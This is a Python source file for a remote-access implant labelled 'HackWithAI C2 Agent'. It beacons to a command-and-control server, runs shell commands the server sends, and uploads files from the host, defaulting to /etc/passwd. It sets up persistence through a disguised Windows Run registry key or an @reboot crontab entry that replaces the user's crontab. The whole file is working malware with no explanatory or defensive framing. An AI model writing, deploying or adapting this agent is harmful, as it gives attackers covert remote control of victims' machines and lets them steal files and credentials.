#!/usr/bin/env python3
# HackWithAI C2 Agent — linux
import socket, json, time, subprocess, os, platform, base64, random, threading
C2 = "127.0.0.1:8080"
AGENT_ID = ""
JITTER = 5


def enc(data): 
    import base64; return base64.b64encode(data.encode()).decode()
def dec(data): 
    import base64; return base64.b64decode(data).decode(errors="ignore")

def beacon():
    global AGENT_ID
    try:
        import urllib.request
        # Register
        if not AGENT_ID:
            req = urllib.request.Request(
                f"http://{C2}/register",
                headers={"X-Hostname": platform.node(), "X-OS": platform.system()}
            )
            with urllib.request.urlopen(req, timeout=10) as r:
                data = json.loads(r.read())
                AGENT_ID = data["agent_id"]
        # Get task
        req = urllib.request.Request(f"http://{C2}/task?id={AGENT_ID}")
        with urllib.request.urlopen(req, timeout=10) as r:
            task = json.loads(r.read())
        # Execute
        cmd = task.get("command","beacon")
        if cmd == "beacon": return
        if cmd == "shell":
            try:
                out = subprocess.check_output(task.get("args",["id"])[0], shell=True, timeout=30).decode()
            except Exception as e:
                out = str(e)
            urllib.request.urlopen(urllib.request.Request(
                f"http://{C2}/result", data=json.dumps({"agent_id": AGENT_ID, "output": out}).encode(),
                headers={"Content-Type": "application/json"}))
        elif cmd == "download":
            path = task.get("args",["/etc/passwd"])[0]
            try:
                content = base64.b64encode(open(path,"rb").read()).decode()
                urllib.request.urlopen(urllib.request.Request(
                    f"http://{C2}/upload",
                    data=json.dumps({"agent_id": AGENT_ID, "filename": os.path.basename(path), "content": content}).encode(),
                    headers={"Content-Type": "application/json"}))
            except Exception as e:
                pass
    except Exception:
        pass

def persist():
    try:
        if os.name == "nt":
            import winreg
            key = winreg.HKEY_CURRENT_USER
            subkey = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(key, subkey, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "SystemHelper", 0, winreg.REG_SZ, __file__)
        else:
            cron = f"@reboot python3 {os.path.abspath(__file__)}\n"
            os.system(f"echo '{cron}' | crontab - 2>/dev/null")
    except:
        pass

if __name__ == "__main__":
    persist()
    while True:
        beacon()
        time.sleep(random.randint(1, JITTER + 3))
